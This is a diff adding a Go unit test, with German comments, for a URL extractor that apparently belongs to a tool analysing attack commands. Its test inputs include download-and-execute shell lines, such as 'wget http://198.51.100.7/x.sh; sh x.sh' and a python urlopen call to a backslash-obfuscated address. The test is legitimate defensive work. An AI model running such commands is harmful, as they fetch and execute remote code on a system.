@@ -69,3 +69,15 @@ func TestHiddenURLInReportAndAttack(t *testing.T) {
 		t.Errorf("Nachlade-Adresse fehlt in der Zähltabelle: %v", topKeys(e))
 	}
 }
+
+// Adressen, die mit Backslashes verschleiert sind, werden vollständig erkannt.
+func TestAllURLsBackslash(t *testing.T) {
+	in := `python -c "import urllib2; print urllib2.urlopen('http://ex\a\m\ple.o\r\g/t.sh').read()"`
+	got := allURLs(in, nil, 5)
+	if len(got) != 1 || got[0] != "http://example.org/t.sh" {
+		t.Errorf("Adresse: %v", got)
+	}
+	if got := allURLs("wget http://198.51.100.7/x.sh; sh x.sh", nil, 5); len(got) != 1 || got[0] != "http://198.51.100.7/x.sh" {
+		t.Errorf("einfache Adresse: %v", got)
+	}
+}
